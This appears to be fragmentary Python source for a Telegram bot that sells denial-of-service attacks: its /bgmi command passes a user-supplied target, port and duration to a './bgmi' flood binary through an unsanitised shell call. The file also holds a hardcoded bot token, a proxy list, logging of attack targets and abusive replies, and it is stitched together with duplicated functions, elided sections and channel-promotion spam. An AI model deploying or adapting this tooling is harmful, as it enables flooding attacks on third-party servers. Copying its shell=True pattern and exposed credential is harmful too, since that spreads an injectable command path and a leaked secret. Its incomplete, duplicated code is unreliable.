...
# Join :- @XNARUTO_X #bgmiddoserpython
...
# Join :- @XNARUTO_X #from keep_alive import keep_alive
# Join :- @XNARUTO_X #keep_alive()
# Join :- @XNARUTO_X # insert your Telegram bot token here
bot = telebot.TeleBot('7340206060:AAHqzZ88wl13pKrnwbQeWeODPlJRbnthq5o')

# Join :- @XNARUTO_X # Admin user IDs
admin_id = ["984245153"]

# Join :- @XNARUTO_X # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @XNARUTO_X # File to store command logs
LOG_FILE = "log.txt"


# Join :- @XNARUTO_X # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @XNARUTO_X # Add more proxy addresses as needed
]
...
# Join :- @BrutalSaddy # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @BrutalSaddy # Check if line is not empty
...
# Join :- @BrutalSaddy # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @XNARUTO_X # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @BrutalSaddy # Function to clear logs
def clear_logs():
    try:
...
# Join :- @BrutalSaddy # Function to record command logs
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "BETICHOD OWNER HI SIRF USE KAREGA."
...
def clear_logs_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "BETICHOD OWNER HI SIRF USE KSREGA."
    bot.reply_to(message, response)
...
def show_all_users(message):
    ...
    if user_id in admin_id:
        ...
        response = "BETOCHOD ONWER HI USE KAREGA."
    bot.reply_to(message, response)
...
# Join :- @XNARUTO_X # Function to handle the reply when free users run the /bgmi command
...
# Join :- @XNARUTO_X # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @XNARUTO_X # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @XNARUTO_X # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @BrutalSaddy # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown . Please Wait 1min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Join :- @XNARUTO_X # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @XNARUTO_X # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @XNARUTO_X # Convert time to integer
            time = int(command[3])  # Join :- @XNARUTO_X # Convert port to integer
            if time > 301:
                response = "Error: Time interval must be less than 200."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @XNARUTO_X # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @XNARUTO_X # Updated command syntax
    else:
        response = " BETA PEHLE BUY NHI TO AUKAT ME REH ."

    bot.reply_to(message, response)



# Join :- @XNARUTO_X # Add /mylogs command to display logs recorded for bgmi and website commands
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        response = "BSDK KE AUKAT ME OWNER HI USE KAREGA."
...
# Join :- @XNARUTO_X # Import the 'time' module for sleep functionality
import time
...
# Join :- @XNARUTO_X # Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
...
# Join :- @XNARUTO_X # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
...
# Join :- @XNARUTO_X # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
